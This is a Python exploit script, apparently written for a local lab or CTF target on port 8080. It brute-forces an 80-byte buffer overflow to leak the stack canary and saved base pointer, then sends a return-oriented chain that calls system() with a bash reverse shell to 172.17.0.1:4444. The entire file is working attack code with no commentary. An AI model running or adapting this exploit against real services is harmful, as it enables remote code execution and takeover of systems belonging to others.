#!/usr/bin/env python3

import socket, struct

host, port = '127.0.0.1', 8080

outbuf = b'a' * 80

for i in range(32):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    assert sock.send(outbuf) == len(outbuf)
    inbuf = sock.recv(1024)
    assert len(inbuf) == len(outbuf) + 1

    print('%02x' % inbuf[-1], end=' ', flush=True)
    outbuf += bytes([inbuf[-1]])

print()

rbp_value = struct.unpack('<Q', outbuf[80+16:80+24])[0]
buffer_addr = rbp_value - 208

system_addr = 0x7ffff7a50270
gadget_addr = 0x555555554d63

if False:
    binsh_addr = 0x7ffff7b94cc9
    outbuf2 = b'a' * 80
    outbuf2 += outbuf[80:80+24]
    outbuf2 += struct.pack('<Q', gadget_addr)
    outbuf2 += struct.pack('<Q', binsh_addr)
    outbuf2 += struct.pack('<Q', system_addr)

else:
    outbuf2 = b'a' * 80
    outbuf2 += outbuf[80:80+24]
    outbuf2 += struct.pack('<Q', gadget_addr)
    outbuf2 += struct.pack('<Q', buffer_addr + 128)
    outbuf2 += struct.pack('<Q', system_addr)

    #outbuf2 += b'echo hi >/tmp/hi\x00'
    outbuf2 += b'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\x00'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
assert sock.send(outbuf2) == len(outbuf2)
